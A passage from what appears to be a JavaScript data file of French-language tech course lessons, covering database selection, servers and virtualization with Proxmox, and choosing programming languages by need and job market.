→ Utilisé EN COMPLÉMENT d'une DB principale
→ Pas pour les données critiques (RAM)

Elasticsearch :
→ N°1 pour la recherche full-text avancée
→ Utilisé avec PostgreSQL : la DB principale stocke, ES indexe
→ Complexe à opérer → Meilisearch/Typesense pour petits projets

Cassandra :
→ Volumes ÉNORMES (pétaoctets), multi-région
→ Overkill pour < 500M lignes
→ Pas de JOINs, requêtes limitées, mais écriture ultra-rapide
\`\`\``
      },
      {
        id: "guide-choix-bdd",
        title: "Guide de décision et erreurs à éviter",
        duration: "15 min",
        content: `# Guide de décision

## L'arbre de décision

\`\`\`
Tu démarres un projet ?
    ↓
Données très relationnelles (beaucoup de JOINs, intégrité) ?
    ├── OUI → PostgreSQL  ← choix par défaut, 90% des cas
    └── NON → Données vraiment hiérarchiques/variables ?
                  ├── OUI → MongoDB
                  └── NON → PostgreSQL quand même :)

Besoin de vitesse extrême sur données simples ?
    → Redis (en complément de ta DB principale)

Besoin de recherche full-text ?
    → Meilisearch (< 1M docs, simple)
    → Elasticsearch (gros volumes, fonctionnalités avancées)

Métriques / séries temporelles ?
    → TimescaleDB (extension PostgreSQL, simple)
    → InfluxDB (standalone, plus de fonctionnalités)

Relations complexes (graphes) ?
    → Neo4j
    → "Amis des amis", "produits souvent achetés ensemble"

Volume > 500M lignes, multi-région, écriture massive ?
    → DynamoDB (AWS) ou Cassandra
    → Mais vraiment seulement si tu as ce problème
\`\`\`

## Architecture polyglotte : plusieurs bases ensemble

\`\`\`
Architecture courante en production :

Application
    │
    ├──► PostgreSQL    (source de vérité, données critiques)
    │
    ├──► Redis         (cache + sessions + real-time)
    │
    └──► Elasticsearch (recherche full-text)

Flux de données :
Écriture → PostgreSQL
Lecture fréquente → Redis (cache invalidé quand PG change)
Recherche texte → Elasticsearch (synchronisé depuis PG via triggers/CDC)

Exemple réel de stack :
Supabase (PostgreSQL + Auth + Storage)
+ Upstash Redis (cache, sessions)
+ Meilisearch (recherche)
= 3 services, gratuits ou très peu chers, couvrent 99% des besoins
\`\`\`

## Tableau récapitulatif par cas d'usage

\`\`\`
Cas d'usage               Solution recommandée
─────────────────────     ──────────────────────────────────────
Blog / CMS                PostgreSQL
E-commerce                PostgreSQL + Redis (panier)
SaaS B2B                  PostgreSQL
App mobile backend        PostgreSQL ou Supabase (PostgreSQL managé)
Catalogue produits        PostgreSQL + JSONB (ou MongoDB si très variable)
Logs applicatifs          Elasticsearch ou Loki
Métriques serveur         Prometheus + Grafana + TimescaleDB
Sessions utilisateurs     Redis
Cache API                 Redis
Recherche dans l'app      Meilisearch ou Elasticsearch
Recommandations IA        PostgreSQL + pgvector
Chat temps réel           Redis Pub/Sub + PostgreSQL (stockage)
IoT / séries temporelles  InfluxDB ou TimescaleDB
Fichiers (images, vidéos) S3 ou équivalent (pas une DB !)
\`\`\`

## Les 5 erreurs classiques

\`\`\`
1. "MongoDB parce que c'est plus cool que SQL"
   → Choisir pour la hype, pas l'adéquation
   → PostgreSQL est le meilleur choix généraliste

2. "On va utiliser Cassandra au cas où ça scale"
   → Over-engineering extrême
   → PostgreSQL scale jusqu'à plusieurs téraoctets
   → Cassandra est très complexe à opérer

3. "Tout dans Redis"
   → Redis = cache, pas DB principale
   → Les données RAM se perdent sans persistance configurée

4. "On changera de DB si nécessaire"
   → Migrer une DB de prod = projet à part entière
   → Bien choisir dès le début, sans sur-ingénierer

5. "Plus de bases = meilleure architecture"
   → Chaque base supplémentaire = coût opérationnel
   → PostgreSQL peut faire le travail de 3-4 autres bases
     (JSONB ≈ MongoDB, pgvector ≈ Pinecone, full-text ≈ Elasticsearch basique)

Règle d'or :
Commence avec PostgreSQL seul.
Ajoute Redis quand tu as un problème de performance mesurable.
Ajoute Elasticsearch quand la recherche devient vraiment nécessaire.
N'ajoute Cassandra/Kafka/etc. que si tu as vraiment le problème qu'ils résolvent.
\`\`\``
      }
    ]
  },

  // ─── SERVEURS & INFRASTRUCTURE ────────────────────────────────────────────
  {
    id: "serveurs-vm",
    category: "Serveurs & Infra",
    emoji: "🖥️",
    title: "Serveurs & Machines Virtuelles",
    description: "Des bases des serveurs jusqu'à Proxmox et les solutions de virtualisation",
    level: "Débutant",
    color: "#6366F1",
    lessons: [
      {
        id: "serveurs-bases",
        title: "Qu'est-ce qu'un serveur ?",
        duration: "10 min",
        content: `# Qu'est-ce qu'un serveur ?

Un **serveur** est un ordinateur (ou un programme) qui répond aux demandes d'autres machines appelées **clients**. Il "sert" des ressources : fichiers, pages web, emails, bases de données…

## Serveur physique vs ordinateur de bureau

| Caractéristique | Ordinateur de bureau | Serveur |
|----------------|---------------------|---------|
| Disponibilité | Utilisé à la demande | Allumé 24h/24, 7j/7 |
| Fiabilité | Standard | Composants redondants (PSU, disques) |
| Refroidissement | Ventilateurs classiques | Refroidissement intensif |
| Forme | Tour / portable | Rack 1U, 2U, lame |
| Interface | Écran + clavier | Souvent sans (headless) |
| OS | Windows, macOS | Linux (Debian, Ubuntu Server, RHEL…) |

## Les types de serveurs

### Bare metal (physique)
Un vrai ordinateur dédié, sans couche d'abstraction. Les ressources sont à 100% disponibles.

\`\`\`
┌────────────────────────────┐
│      Ton application       │
│         Système d'exploitation (Linux)        │
│    Matériel physique (CPU, RAM, disques)   │
└────────────────────────────┘
\`\`\`

**Avantages :** performances maximales, contrôle total
**Inconvénients :** coût élevé, difficile à scaler

### Serveur dédié (hébergeur)
Tu loues un serveur physique chez un hébergeur (OVH, Hetzner, Kimsufi…). Tu as le contrôle total du matériel, mais tu ne le possèdes pas.

### VPS (Virtual Private Server)
Un serveur virtuel qui émule un serveur physique. Tu obtiens une partition isolée d'un gros serveur. Moins cher qu'un dédié, légèrement moins performant.

**Hébergeurs populaires :** DigitalOcean, Linode, OVH VPS, Scaleway, Vultr

### Cloud (IaaS)
Des ressources à la demande : tu paies à l'usage, tu peux scaler en quelques secondes.

**Exemples :** AWS EC2, Google Compute Engine, Azure VMs

## Anatomie d'un serveur physique

\`\`\`
┌──────────────────────────────────────────┐
│  CPU(s)        │  RAM ECC (Error Correcting)  │
│  1-4 sockets   │  32 Go à plusieurs To          │
├────────────────┼──────────────────────────────┤
│  Stockage      │  Réseau                       │
│  HDD/SSD/NVMe  │  1G / 10G / 25G ports         │
│  RAID hardware │  Multiples cartes réseau       │
├────────────────┴──────────────────────────────┤
│  IPMI / iDRAC / iLO (accès à distance même    │
│  si le serveur est éteint ou planté)           │
└────────────────────────────────────────────────┘
\`\`\`

## Les unités de mesure : le "rack"

Les serveurs pros se montent dans des **baies rack** standardisées.

- **1U** = 1 Unité = 4,45 cm de hauteur
- **2U** = 8,9 cm (plus de place pour composants)
- **Full tower** = jusqu'à 42U dans une baie standard

\`\`\`
┌─────────────────┐
│  ████ Serveur 1U│ ← 1U : serveur compact
│  ████ Serveur 1U│
│  ██████████ 2U  │ ← 2U : plus de disques/RAM
│  ██████████ 2U  │
│  ┌──────────┐   │
│  │  Switch  │   │ ← Équipement réseau
│  └──────────┘   │
└─────────────────┘
      Baie rack
\`\`\`

## Où héberger son serveur ?

| Option | Lieu | Coût | Contrôle |
|--------|------|------|---------|
| **Homelab** | Chez soi | Faible (électricité) | Total |
| **Colocation** | Datacenter tiers | Moyen | Total (ton matériel) |
| **Dédié loué** | Hébergeur | Moyen | Élevé |
| **VPS** | Hébergeur | Faible | Moyen |
| **Cloud** | AWS/GCP/Azure | Variable | Faible |`
      },
      {
        id: "virtualisation-concepts",
        title: "La virtualisation : comment ça marche ?",
        duration: "14 min",
        content: `# La virtualisation : comment ça marche ?

La **virtualisation** permet de faire tourner plusieurs systèmes d'exploitation sur un seul serveur physique, en les isolant les uns des autres.

## Le problème sans virtualisation

Sans virtualisation, un serveur = un OS = une application principale.

\`\`\`
Serveur A          Serveur B          Serveur C
(Web)              (BDD)              (Mail)
CPU: 5% utilisé    CPU: 10% utilisé   CPU: 3% utilisé
→ 82% de gaspillage de ressources !
\`\`\`

## La solution : l'hyperviseur

Un **hyperviseur** est un logiciel qui crée et gère des **machines virtuelles (VMs)**. Chaque VM croit être un vrai ordinateur, mais partage les ressources physiques.

\`\`\`
┌────────────┬────────────┬────────────┐
│   VM 1     │   VM 2     │   VM 3     │
│  (Web)     │  (BDD)     │  (Mail)    │
│  Ubuntu    │  Debian    │  Ubuntu    │
├────────────┴────────────┴────────────┤
│         HYPERVISEUR                 │
├─────────────────────────────────────┤
│      Matériel physique              │
│    (CPU, RAM, Disques, Réseau)      │
└─────────────────────────────────────┘
\`\`\`

## Type 1 vs Type 2

### Hyperviseur de Type 1 (bare-metal)
S'installe **directement sur le matériel**, sans OS hôte. Plus performant.

\`\`\`
VMs → Hyperviseur → Matériel
\`\`\`

**Exemples :** Proxmox VE, VMware ESXi, Microsoft Hyper-V, Xen

### Hyperviseur de Type 2 (hosted)
S'installe **au-dessus d'un OS existant** (Windows, macOS). Moins performant mais plus simple.

\`\`\`
VMs → Hyperviseur → OS hôte → Matériel
\`\`\`

**Exemples :** VirtualBox, VMware Workstation, Parallels Desktop

## VMs vs Conteneurs

| Aspect | Machine Virtuelle (VM) | Conteneur (Docker) |
|--------|----------------------|-------------------|
| Isolation | Complète (kernel propre) | Partielle (kernel partagé) |
| Poids | Plusieurs Go (OS complet) | Quelques Mo |
| Démarrage | 1-2 minutes | Quelques secondes |
| Performance | Légèrement réduite | Quasi-native |
| Cas d'usage | OS différents, isolation forte | Microservices, apps |

\`\`\`
VM                          Conteneur
┌──────────────────┐         ┌──────────────────┐
│ App              │         │ App              │
│ Bibliothèques    │         │ Bibliothèques    │
│ OS invité (3 Go) │         ├──────────────────┤
│ Hyperviseur      │         │ Docker Engine    │
│ OS hôte          │         │ OS hôte          │
│ Matériel         │         │ Matériel         │
└──────────────────┘         └──────────────────┘
\`\`\`

## Les conteneurs LXC

**LXC** (Linux Containers) est un intermédiaire entre VMs et Docker : des conteneurs systèmes légers qui émulent un OS Linux complet sans kernel séparé. Proxmox les supporte nativement.

## Concepts clés à retenir

- **vCPU** : processeur virtuel alloué à une VM
- **RAM allouée** : mémoire réservée pour la VM
- **Snapshot** : photo de l'état d'une VM à un instant T (pour revenir en arrière)
- **Clone** : copie complète d'une VM
- **Template** : modèle de VM pour en créer de nouvelles rapidement
- **Migration live** : déplacer une VM d'un hôte à l'autre sans coupure
- **HA (High Availability)** : redémarrage automatique des VMs en cas de panne d'hôte`
      },
      {
        id: "solutions-virtualisation",
        title: "Les solutions de virtualisation",
        duration: "12 min",
        content: `# Les solutions de virtualisation

Tour d'horizon des principales solutions, du homelab au datacenter.

## Solutions Type 1 (bare-metal)

### Proxmox VE
**Gratuit, open source.** La référence du homelab et des petites infrastructures pro.

\`\`\`
✅ Gratuit (licence entreprise optionnelle)
✅ Interface web complète
✅ VMs (KVM) + Conteneurs (LXC) dans le même outil
✅ Clustering multi-nœuds
✅ Snapshots, backups intégrés
✅ Communauté très active
❌ Support officiel payant
\`\`\`

**Basé sur :** Debian Linux + KVM + LXC

### VMware ESXi / vSphere
La solution **leader en entreprise**. Très robuste, très cher.

\`\`\`
✅ Fiabilité éprouvée en production
✅ Écosystème complet (vCenter, vSAN, NSX…)
✅ Support professionnel
❌ Licences très coûteuses (suite au rachat par Broadcom)
❌ ESXi gratuit supprimé en 2024
\`\`\`

### Microsoft Hyper-V
Intégré à Windows Server. Bon choix si tu es dans un environnement Microsoft.

\`\`\`
✅ Intégré à Windows Server (inclus dans la licence)
✅ Bien intégré à Azure
✅ Version gratuite (Hyper-V Server, arrêté en 2022)
❌ Interface moins intuitive que Proxmox
❌ Moins flexible hors écosystème Microsoft
\`\`\`

### XCP-ng
Alternative open source à VMware XenServer. Bien adapté aux environnements pro.

\`\`\`
✅ Gratuit, open source (fork de XenServer)
✅ Géré via Xen Orchestra (interface web)
✅ Bon support commercial disponible
❌ Moins populaire que Proxmox côté homelab
\`\`\`

---

## Solutions Type 2 (sur OS existant)

### VirtualBox
**Parfait pour apprendre** sur son PC du quotidien.

\`\`\`
✅ Gratuit, open source (Oracle)
✅ Windows / macOS / Linux
✅ Idéal pour tester des OS
❌ Performances limitées
❌ Pas adapté à la production
\`\`\`

### VMware Workstation / Fusion
Version desktop de VMware, plus performante que VirtualBox.

\`\`\`
✅ Très bonne performance
✅ Workstation Pro gratuit depuis 2024 (usage perso)
✅ Fusion (macOS) gratuit usage perso
❌ Moins de fonctionnalités que ESXi
\`\`\`

### Parallels Desktop (macOS)
La référence pour faire tourner Windows sur Mac, surtout Apple Silicon.

\`\`\`
✅ Excellent support Apple Silicon (M1/M2/M3/M4)
✅ Intégration macOS parfaite
❌ Payant (abonnement ~100€/an)
\`\`\`

---

## Cloud : VMs à la demande

| Provider | Service VM | Particularité |
|---------|-----------|---------------|
| AWS | EC2 | Le plus complet, le plus cher |
| Google Cloud | Compute Engine | Bonne intégration données/ML |
| Azure | Virtual Machines | Idéal écosystème Microsoft |
| Hetzner | Cloud Servers | Excellent rapport qualité/prix (EU) |
| OVHcloud | Public Cloud | Hébergeur européen |

---

## Quelle solution choisir ?

\`\`\`
Tu veux apprendre chez toi ?
→ VirtualBox (simple) ou Proxmox sur un vieux PC

Tu construis un homelab ?
→ Proxmox VE (meilleur rapport fonctionnalités/coût)

Tu es en entreprise avec budget ?
→ VMware vSphere ou Hyper-V (selon l'écosystème existant)

Tu veux de la flexibilité sans matériel ?
→ AWS EC2, Hetzner Cloud, ou OVH VPS
\`\`\``
      },
      {
        id: "proxmox-pratique",
        title: "Proxmox VE en pratique",
        duration: "16 min",
        content: `# Proxmox VE en pratique

Proxmox VE (Virtual Environment) est la solution idéale pour débuter avec la virtualisation sérieuse. Voici comment l'appréhender.

## Installation

Proxmox s'installe sur un serveur physique (ou une VM pour tester), **en remplacement de l'OS existant**.

### Prérequis matériels minimaux
\`\`\`
CPU : 64 bits avec support virtualisation (Intel VT-x / AMD-V)
RAM : 4 Go minimum (8+ Go recommandé pour des VMs)
Stockage : 1 disque pour Proxmox + idéalement 1+ pour les VMs
Réseau : 1 carte réseau (2 recommandé pour séparer management/trafic)
\`\`\`

### Vérifier la virtualisation sur ton CPU

**Linux :**
\`\`\`bash
egrep -c '(vmx|svm)' /proc/cpuinfo
# Résultat > 0 = virtualisation activée
\`\`\`

**Windows :**
\`\`\`cmd
systeminfo | findstr "Hyper-V"
\`\`\`

### Processus d'installation
1. Télécharger l'ISO Proxmox VE sur proxmox.com
2. Flasher sur une clé USB (avec Ventoy, Rufus, balenaEtcher)
3. Booter depuis la clé USB
4. Suivre l'installateur graphique
5. Accéder à l'interface : \`https://IP-DU-SERVEUR:8006\`

---

## L'interface web Proxmox

Une fois connecté (port 8006, HTTPS), tu découvres :

\`\`\`
┌─────────────────────────────────────────────────┐
│ Datacenter                                       │
│  └─ pve (ton nœud)                              │
│      ├─ local (stockage OS)                     │
│      ├─ local-lvm (stockage VMs)                │
│      ├─ 100 (vm) ubuntu-server                  │
│      ├─ 101 (vm) debian-web                     │
│      └─ 102 (ct) nginx-container               │
└─────────────────────────────────────────────────┘
\`\`\`

- **Datacenter** : vue globale du cluster
- **Nœud (pve)** : ton serveur physique
- **VM (KVM)** : machine virtuelle complète
- **CT** : conteneur LXC

---

## Créer sa première VM

### Via l'interface web
1. Clic droit sur ton nœud → **Créer une VM**
2. Remplir les étapes :

\`\`\`
Onglet Général :
  - VM ID : 100 (identifiant unique)
  - Nom : ubuntu-server

Onglet OS :
  - Image ISO : sélectionner l'ISO uploadée
  - Type : Linux, version 6.x

Onglet Système :
  - Carte graphique : Default
  - BIOS : SeaBIOS (ou OVMF pour UEFI)

Onglet Disques :
  - Taille : 20 Go minimum
  - Stockage : local-lvm

Onglet CPU :
  - Sockets : 1
  - Cœurs : 2

Onglet Mémoire :
  - RAM : 2048 Mo (2 Go)

Onglet Réseau :
  - Bridge : vmbr0 (réseau par défaut)
\`\`\`

3. **Démarrer** la VM → Ouvrir la console pour installer l'OS

---

## Créer un conteneur LXC

Beaucoup plus léger qu'une VM pour des services Linux.

1. Télécharger un template : **Stockage local → CT Templates → Télécharger**
2. Clic droit sur le nœud → **Créer CT**
3. Configurer RAM, CPU, stockage, réseau
4. Démarrer → accès shell immédiat

---

## Commandes Proxmox utiles (CLI)

\`\`\`bash
# Lister les VMs
qm list

# Démarrer / arrêter une VM
qm start 100
qm stop 100
qm reboot 100

# Créer un snapshot
qm snapshot 100 snap-avant-maj

# Restaurer un snapshot
qm rollback 100 snap-avant-maj

# Lister les conteneurs LXC
pct list

# Démarrer un conteneur
pct start 102

# Entrer dans un conteneur
pct enter 102
\`\`\`

---

## Les sauvegardes dans Proxmox

### Backup manuel
Clic droit sur une VM → **Backup** → choisir le mode :
- **Stop** : éteint la VM pendant le backup (cohérence maximale)
- **Suspend** : suspend la VM (rapide)
- **Snapshot** : backup à chaud (VM reste allumée)

### Backup automatique
**Datacenter → Backup → Ajouter** : planifier des sauvegardes automatiques pour toutes les VMs.

---

## Réseaux dans Proxmox

Proxmox crée un **bridge réseau** (\`vmbr0\`) par défaut, connecté à ta carte réseau physique. Les VMs se branchent dessus comme sur un switch virtuel.

\`\`\`
Internet
   │
[Routeur/Box]
   │
[vmbr0 - Bridge Proxmox]
   │        │        │
 VM 100   VM 101   CT 102
192.168.1.10  .11    .12
\`\`\`

Tu peux créer des bridges supplémentaires pour isoler des réseaux (DMZ, réseau de gestion…).

---

## Proxmox en cluster

Avec plusieurs serveurs Proxmox, tu peux former un **cluster** :
- Migration live de VMs entre nœuds
- Haute disponibilité (HA) : redémarrage automatique si un nœud tombe
- Interface unifiée pour gérer tous les hôtes

\`\`\`bash
# Sur le premier nœud
pvecm create mon-cluster

# Sur les autres nœuds
pvecm add IP-DU-PREMIER-NOEUD
\`\`\``
      }
    ]
  },

  // ─── LANGAGES ─────────────────────────────────────────────────────────────
  {
    id: "choisir-langage",
    category: "Fondamentaux",
    emoji: "🧠",
    title: "Choisir le bon langage de programmation",
    description: "Idéal vs raisonnable : quel langage pour quel besoin, marché et budget",
    level: "Débutant",
    color: "#F59E0B",
    lessons: [
      {
        id: "langages-panorama",
        title: "Tour des langages et leur domaine",
        duration: "14 min",
        content: `# Tour des langages et leur domaine

Chaque langage a été conçu pour répondre à des besoins précis. Comprendre ça, c'est déjà 80% du chemin pour faire le bon choix.

## JavaScript / TypeScript

**Ce que c'est :** Le seul langage natif du navigateur. TypeScript en est une version typée.

**Forces :**
- Incontournable pour le frontend web (React, Vue, Angular)
- Fonctionne aussi côté backend (Node.js)
- Un seul langage pour front + back = équipes plus petites
- Communauté immense, npm = des millions de packages

**Limites :**
- Pas idéal pour le calcul intensif
- JavaScript sans TypeScript peut vite devenir ingérable sur un gros projet

**Utilisé chez :** Meta, Netflix, Airbnb, LinkedIn, presque partout sur le web

---

## Python

**Ce que c'est :** Langage généraliste très lisible, roi de la data et de l'IA.

**Forces :**
- N°1 pour la data science, le machine learning, l'IA (TensorFlow, PyTorch, scikit-learn)
- Excellent pour les scripts d'automatisation
- Backend web avec Django, FastAPI, Flask
- Syntaxe simple, idéal pour apprendre

**Limites :**
- Lent comparé à Go, Java, Rust (interprété, GIL)
- Moins adapté aux apps mobiles ou embarquées
- Typage dynamique peut causer des bugs en production

**Utilisé chez :** Google, Instagram, Spotify, OpenAI, NASA

---

## Java

**Ce que c'est :** Langage robuste, orienté objet, très présent en entreprise.

**Forces :**
- Extrêmement stable et éprouvé (30 ans d'existence)
- Excellent pour les grosses applications d'entreprise (Spring Boot)
- Android natif (historiquement)
- Très bonne performance, typage fort
- Vaste écosystème d'outils (Maven, Gradle, IntelliJ)

**Limites :**
- Verbeux (beaucoup de code pour peu de résultat)
- Kotlin le remplace progressivement sur Android
- Courbe d'apprentissage plus raide

**Utilisé chez :** Amazon, LinkedIn, eBay, banques, assurances, administrations

---

## C# (.NET)

**Ce que c'est :** Le Java de Microsoft, très utilisé en entreprise et dans le jeu vidéo.

**Forces :**
- Excellent pour les apps Windows et entreprise Microsoft
- Moteur de jeu Unity = C# partout dans le jeu vidéo indie
- .NET est désormais multiplateforme (Linux, macOS)
- Typage fort, très bonne performance

**Limites :**
- Fortement lié à l'écosystème Microsoft
- Moins de traction dans les startups tech

**Utilisé chez :** Microsoft, Stack Overflow, studios de jeux Unity

---

## Go (Golang)

**Ce que c'est :** Langage de Google, conçu pour la performance et la simplicité des systèmes distribués.

**Forces :**
- Très rapide (proche du C)
- Excellente gestion de la concurrence (goroutines)
- Binaires compilés autonomes, parfaits pour Docker/Kubernetes
- Simple à apprendre (peu de concepts)

**Limites :**
- Pas de générics robustes (récemment amélioré)
- Moins de packages que JavaScript ou Python
- Pas adapté au frontend ni à la data science

**Utilisé chez :** Google, Docker, Kubernetes, Dropbox, Cloudflare, Uber

---

## Rust

**Ce que c'est :** Langage système ultra-performant avec sécurité mémoire garantie à la compilation.

**Forces :**
- Performances au niveau du C/C++
- Aucune fuite mémoire possible par conception
- Idéal pour les systèmes embarqués, OS, WebAssembly
- Langage le plus aimé des développeurs (9 ans de suite, Stack Overflow)

**Limites :**
- Courbe d'apprentissage très raide (borrow checker)
- Développement plus lent
- Communauté encore petite, peu de devs disponibles
- Overkill pour la plupart des projets web

**Utilisé chez :** Mozilla, Microsoft, Amazon, Linux kernel, Discord

---

## PHP

**Ce que c'est :** Langage du web historique, toujours très présent.

**Forces :**
- 77% du web tourne sur PHP (dont WordPress)
- Hébergement pas cher et universel
- Laravel est un framework moderne et productif
- Énorme vivier de développeurs

**Limites :**
- Réputation parfois mauvaise (code legacy)
- Moins utilisé dans les nouvelles startups tech

**Utilisé chez :** WordPress, Facebook (origines), Wikipedia, Etsy

---

## Swift / Kotlin

**Ce que c'est :** Les langages modernes pour le mobile natif.

- **Swift** → Apple (iOS, macOS, iPadOS)
- **Kotlin** → Android (remplace Java)

**Forces :**
- Performances natives maximales
- Accès complet aux APIs système
- UX parfaite, applis fluides

**Limites :**
- Chaque plateforme = un langage différent (coût x2)
- Impossible sur l'autre plateforme (Swift ne fonctionne pas sur Android)

---

## Dart (Flutter)

**Ce que c'est :** Le langage de Flutter, solution multiplateforme de Google.

**Forces :**
- Une codebase → iOS + Android + Web + Desktop
- Très bonnes performances (compilé natif)
- Productivité élevée

**Limites :**
- Communauté plus petite que React Native
- Dart est peu utilisé en dehors de Flutter

---

## Tableau récapitulatif par domaine

| Besoin | Langages adaptés |
|--------|-----------------|
| Frontend web | JavaScript, TypeScript |
| Backend web | Python, JavaScript/Node, Java, Go, PHP, C# |
| Mobile iOS | Swift (natif), Dart/Flutter, JS/React Native |
| Mobile Android | Kotlin (natif), Dart/Flutter, JS/React Native |
| Data / IA / ML | Python |
| Systèmes / OS | Rust, C, C++ |
| Jeu vidéo | C# (Unity), C++ (Unreal) |
| Scripts / Automatisation | Python, Bash, PowerShell |
| Infrastructure / DevOps | Go, Python, Bash |
| Embarqué / IoT | C, C++, Rust |`
      },
      {
        id: "langages-marche",
        title: "Ce que dit le marché : devs, salaires, coûts",
        duration: "12 min",
        content: `# Ce que dit le marché : devs, salaires, coûts

Choisir un langage "parfait" techniquement mais avec 50 développeurs disponibles dans ton pays, c'est se créer un problème. Voici la réalité du marché.

## Popularité & disponibilité des développeurs

D'après le Stack Overflow Developer Survey 2024 et les offres d'emploi réelles :

| Langage | % de devs qui l'utilisent | Offres d'emploi (marché FR/EU) |
|---------|--------------------------|-------------------------------|
| JavaScript | 62% | ★★★★★ Très abondant |
| Python | 51% | ★★★★★ Très abondant |
| TypeScript | 38% | ★★★★☆ Abondant |
| Java | 30% | ★★★★★ Très abondant |
| C# | 27% | ★★★★☆ Abondant |
| PHP | 18% | ★★★★☆ Abondant |
| Go | 13% | ★★★☆☆ Modéré |
| Rust | 12% | ★★☆☆☆ Rare |
| Kotlin | 9% | ★★★☆☆ Modéré |
| Swift | 5% | ★★☆☆☆ Rare |
| Dart | 6% | ★★☆☆☆ Rare |

> **À retenir :** JavaScript, Python, Java, C# et PHP = le gros du marché. Ce sont les langages pour lesquels tu trouveras facilement des devs.

---

## Coût approximatif d'un développeur (France, 2024)

| Profil | Salaire annuel (CDI) | TJM freelance |
|--------|---------------------|---------------|
| Dev JS/React junior | 32-40 k€ | 350-450 €/j |
| Dev JS/React senior | 50-70 k€ | 550-750 €/j |
| Dev Python junior | 33-42 k€ | 350-480 €/j |
| Dev Python senior | 52-72 k€ | 550-800 €/j |
| Dev Java senior | 55-75 k€ | 600-850 €/j |
| Dev Go senior | 65-85 k€ | 700-950 €/j |
| Dev Rust senior | 75-95 k€ | 900-1200 €/j |
| Dev Swift/iOS senior | 60-80 k€ | 700-1000 €/j |
| Dev Kotlin/Android senior | 55-75 k€ | 650-900 €/j |

> **La règle :** plus le langage est rare → plus le développeur est cher ET plus il est difficile à trouver.

---

## Les pièges à éviter

### Le piège "langage tendance"
\`\`\`
❌ "On va faire le backend en Elixir, c'est génial pour la concurrence"
→ 12 CVs reçus pour le poste en 3 mois
→ 2 candidats qualifiés, salaires +40% au-dessus du marché
→ Projet bloqué pendant 5 mois
\`\`\`

### Le piège "optimisation prématurée"
\`\`\`
❌ "Notre appli doit être en Rust pour les performances"
→ Développement 3x plus lent
→ L'appli n'a que 200 utilisateurs
→ Python aurait largement suffi pendant 2 ans
\`\`\`

### Le piège "stack exotique"
\`\`\`
❌ "On fait mobile en Flutter + backend en Elixir + ML en Julia"
→ 3 langages rares
→ Impossible de recruter un dev full-stack
→ Dépendance totale à 1-2 personnes clés
\`\`\`

---

## La règle d'or du choix pragmatique

\`\`\`
Score d'un langage = (Adéquation technique × 0.4)
                   + (Disponibilité des devs  × 0.35)
                   + (Coût accessible         × 0.15)
                   + (Pérennité / communauté  × 0.10)
\`\`\`

**La technique ne doit jamais peser plus de 40% dans ta décision.**

---

## Signaux d'alerte pour un choix de langage

- Moins de 5 000 questions sur Stack Overflow → communauté trop petite
- Moins de 2 000 packages/librairies disponibles → tu devras tout coder
- Moins de 1 000 offres d'emploi sur LinkedIn (ton pays) → recrutement très difficile
- Dernière version majeure > 2 ans → risque d'abandon
- Un seul mainteneur principal → risque de discontinuité`
      },
      {
        id: "langages-choix-par-besoin",
        title: "Idéal vs raisonnable : le guide par besoin",
        duration: "16 min",
        content: `# Idéal vs raisonnable : le guide par besoin

Pour chaque situation, voici le choix **techniquement parfait** et le choix **pragmatique** qui tient compte de la réalité du marché.

---

## Site web / Application web (startup)

**Contexte :** tu lances un produit, l'équipe est petite, le budget limité.

| | Langage | Pourquoi |
|-|---------|---------|
| ✨ Idéal technique | Go + React/TS | Performance, typage, efficacité |
| ✅ Choix raisonnable | **Node.js/TypeScript + React** | Un seul langage JS front+back, pool de devs énorme, bibliothèques illimitées |

> **Verdict :** Node.js + TypeScript. Tu recrutes facilement, la vélocité est maximale. Quand tu atteins 1M d'utilisateurs, tu migreras les services critiques en Go ou tu scalerasavec du cloud.

---

## Application d'entreprise (métier, ERP, gestion)

**Contexte :** grosse équipe, longue durée de vie, intégrations avec d'autres systèmes.

| | Langage | Pourquoi |
|-|---------|---------|
| ✨ Idéal technique | Kotlin + Spring ou Go | Typage fort, performances |
| ✅ Choix raisonnable | **Java (Spring Boot) ou C#** | Marché saturé de devs Java/C#, stabilité prouvée 20 ans, excellent support entreprise |

> **Verdict :** Java si tu vises de nombreux devs moins chers, C# si tu es dans l'écosystème Microsoft. Les deux sont solides pour 20 ans.

---

## Application mobile

**Contexte :** tu veux être sur iOS ET Android.

| | Choix | Pourquoi |
|-|-------|---------|
| ✨ Idéal technique | Swift (iOS) + Kotlin (Android) | Performances natives maximales, accès total aux APIs |
| ✅ Choix raisonnable (budget serré) | **React Native (JS/TS)** | Une équipe web existante peut souvent l'utiliser, pool de devs énorme |
| ✅ Choix raisonnable (nouvelle appli) | **Flutter (Dart)** | Performances quasi-natives, une seule codebase, en forte croissance |

> **Verdict :**
> - Tu as déjà une équipe web JS → **React Native**
> - Tu pars de zéro et veux le meilleur cross-platform → **Flutter**
> - Ton app est très complexe / liée aux hardware spécifiques → natif Swift/Kotlin

---

## Data Science / Intelligence Artificielle

**Contexte :** analyse de données, modèles ML, IA générative.

| | Langage | Pourquoi |
|-|---------|---------|
| ✨ Idéal technique | Python | PyTorch, TensorFlow, scikit-learn, pandas… l'écosystème IA est en Python |
| ❌ Alternative risquée | Julia, R | Puissants mais communautés très petites, peu de devs |

> **Verdict :** **Python, sans hésiter.** C'est l'un des rares domaines où le choix idéal ET le choix raisonnable sont identiques. L'écosystème IA est massivement en Python, il n'y a pas d'alternative crédible.

---

## API / Microservices haute performance

**Contexte :** beaucoup de requêtes simultanées, latence critique.

| | Langage | Pourquoi |
|-|---------|---------|
| ✨ Idéal technique | **Go ou Rust** | Performances exceptionnelles, faible empreinte mémoire |
| ✅ Choix raisonnable | **Go** | Performances excellentes + beaucoup plus simple que Rust + pool de devs croissant |
| ⚠️ Acceptable | Python (FastAPI) ou Node.js | Suffisant pour la majorité des projets, devs faciles à trouver |

> **Verdict :** Si tu as vraiment des contraintes de performance mesurées → **Go**. Sinon, **FastAPI (Python) ou Node.js** suffisent pour 95% des projets.

---

## Logiciel système / Embarqué / Bas niveau

**Contexte :** drivers, OS, firmware, IoT.

| | Langage | Pourquoi |
|-|---------|---------|
| ✨ Idéal technique (moderne) | **Rust** | Sécurité mémoire sans garbage collector |
| ✅ Choix raisonnable | **C / C++** | 50 ans d'existence, documentation immense, devs disponibles, tous les outils existent |

> **Verdict :** C/C++ reste le standard. Rust est l'avenir mais peu de devs maîtrisent le borrow checker. Sauf si tu pars de zéro avec une équipe motivée → Rust. Sinon → C++.

---

## Jeu vidéo

**Contexte :** jeu indie, mobile, ou AA/AAA.

| | Moteur | Langage | Cas d'usage |
|-|--------|---------|------------|
| ✨ Indie / mobile | **Unity** | C# | Facile à apprendre, stores iOS/Android, assets store |
